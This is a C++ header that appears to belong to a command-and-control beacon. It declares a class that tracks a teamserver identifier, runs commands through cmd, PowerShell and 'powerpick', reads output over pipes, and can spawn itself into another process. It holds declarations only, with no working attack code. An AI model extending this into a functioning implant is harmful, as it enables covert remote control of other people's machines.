#pragma once
#include<string>
#include "Windows.h"
#include "process.h"
//#include "Communicator.h"

class core
{

public:
	static core* instance;
	static bool terminated;
	static PROCESS_INFO* persistent_process;
	static std::string currentPath;
	static int sleepTime;
	//static Communicator *communicator;
	std::string identifier = ""; // this will be the identifier used by teamserver to distinct different beacons

	core();
	// we need this contructor in order to be able to force set the identifier (used to spawn the beacon to another process)
	core(std::string identifier);

	// NOTE: cmd is not the actual command for CMD.exe or POWERSHELL.exe, but the command ready to be processed by beacon
	void execute_command(std::string cmd);

	DWORD __stdcall read_data_anon_pipe(void* argh);

	static bool invalid_char(char c);

	static void read_pipe(HANDLE rdPipe);

	static void read_pipe_once(HANDLE rdPipe);

private:

	void execute_cmd(std::string cmd);

	void execute_powershell(std::string cmd);

	void execute_powerpick(std::string cmd);
};

